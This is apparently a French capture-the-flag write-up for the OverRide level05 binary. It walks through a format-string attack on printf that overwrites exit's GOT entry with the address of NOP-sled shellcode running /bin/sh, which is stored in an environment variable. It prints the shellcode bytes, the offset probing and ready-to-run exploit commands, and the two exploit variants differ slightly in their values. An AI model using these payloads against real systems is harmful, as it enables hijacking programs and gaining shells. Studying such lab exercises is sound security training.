# Level05

Nous devons réaliser un GOT Override, grace à l'exploit sur `printf`

On va remplacer l'adresse d'exit qui est appelé juste après printf par l'adresse de notre shellcode
que nous placerons dans l'env.

On cherche l'adresse d'exit dans la GOT avec objdump -R
```
./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
On trouve 0x080497e0

Maintenant, on cherche l'offset auquel printf peut override
```
level05@OverRide:~$ python -c 'print "B"*4 + "%08x."*20' | ./level05
bbbb00000064.f7fcfac0.f7ec3add.ffffd66f.ffffd66e.00000000.ffffffff.ffffd6f4.f7fdb000.62626262.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
```

On trouve donc nos B à la 10ième positions. (On voit que c'est 62 et non 42, vu que notre string est mis en minuscule)
```
level05@OverRide:~$ ./level05
BBBB%10$p
bbbb0x62626262
```

On place notre shellcode dans l'env précédé de 100 NOP:
```
export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x
68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'`
```

On cherche l'adresse d'un NOP slide dans la stack:
```
level05@OverRide:~$ gdb ./level05
Breakpoint 1, 0x08048444 in main ()
(gdb) x/200x $esp
0xffffd69c:     0xf7e45513      0x00000001      0xffffd734      0xffffd73c
0xffffd6ac:     0xf7fd3000      0x00000000      0xffffd71c      0xffffd73c
0xffffd6bc:     0x00000000      0x08048230      0xf7fceff4      0x00000000
0xffffd6cc:     0x00000000      0x00000000      0xd42d9c6d      0xe329787d
0xffffd6dc:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffd6ec:     0x08048390      0x00000000      0xf7ff0a50      0xf7e45429
0xffffd6fc:     0xf7ffcff4      0x00000001      0x08048390      0x00000000
0xffffd70c:     0x080483b1      0x08048444      0x00000001      0xffffd734
0xffffd71c:     0x08048520      0x08048590      0xf7feb620      0xffffd72c
0xffffd72c:     0xf7ffd918      0x00000001      0xffffd853      0x00000000
0xffffd73c:     0xffffd86f      0xffffd8f5      0xffffd909      0xffffd919
0xffffd74c:     0xffffd938      0xffffd94b      0xffffd958      0xffffde79
0xffffd75c:     0xffffde85      0xffffde9c      0xffffdee9      0xffffdef8
0xffffd76c:     0xffffdf10      0xffffdf21      0xffffdf2a      0xffffdf32
0xffffd77c:     0xffffdf4b      0xffffdf5d      0xffffdf6d      0xffffdf9a
0xffffd78c:     0xffffdfba      0x00000000      0x00000020      0xf7fdb430
0xffffd79c:     0x00000021      0xf7fdb000      0x00000010      0x178bfbff
0xffffd7ac:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffd7bc:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffd7cc:     0x00000005      0x00000008      0x00000007      0xf7fdc000
0xffffd7dc:     0x00000008      0x00000000      0x00000009      0x08048390
0xffffd7ec:     0x0000000b      0x000003ed      0x0000000c      0x000003ed
0xffffd7fc:     0x0000000d      0x000003ed      0x0000000e      0x000003ed
0xffffd80c:     0x00000017      0x00000000      0x00000019      0xffffd83b
0xffffd81c:     0x0000001f      0xffffdfdc      0x0000000f      0xffffd84b
0xffffd82c:     0x00000000      0x00000000      0x00000000      0x49000000
0xffffd83c:     0x6e2246ac      0x6ac915c0      0x71b52c2c      0x6918d0fb
0xffffd84c:     0x00363836      0x2f000000      0x656d6f68      0x6573752f
0xffffd85c:     0x6c2f7372      0x6c657665      0x6c2f3530      0x6c657665
0xffffd86c:     0x53003530      0x4c4c4548      0x45444f43      0x9090903d
0xffffd87c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd88c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd89c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8dc:     0x50c03190      0x732f6e68      0x2f2f6868      0xe3896962
0xffffd8ec:     0xd231c931      0x80cd0bb0      0x52455400      0x74783d4d
0xffffd8fc:     0x2d6d7265      0x63363532      0x726f6c6f      0x45485300
0xffffd90c:     0x2f3d4c4c      0x2f6e6962      0x68736162      0x48535300
0xffffd91c:     0x494c435f      0x3d544e45      0x302e3031      0x322e322e
0xffffd92c:     0x30373520      0x34203630      0x00323432      0x5f485353
```

On choisi l'adresse d'un NOP près du shellcode: 0xffffd8d0

Maintenant on va diviser notre adresse en 2 `short` pour pouvoir l'injecter sinon la valeur est trop grande.

```
$ node
> 0xd8d0
55504				; les 2 derniers octets en decimal
> 0xd8d0 - 8		; On enleve 8 pour l'adresse d'exit
55495
> 0xffff
65535				; les 2 premiers octets en decimal
> 0xffff - 0xd8d0	; les 2 premiers octets moins les 2 derniers deja écrits
10031
```

On peut maintenant exploiter le binaire avec la commande suivante:
```
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55496x%10$hn%10031x%11$hn"'; cat) | ./level05
```

Ou directement comme ca:
```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%" + str(0xd8d0 - 8) + "x%10$hn" +"%" + str(0xffff - 0xd8d0) + "x%11$n")';cat) | ./level05
```
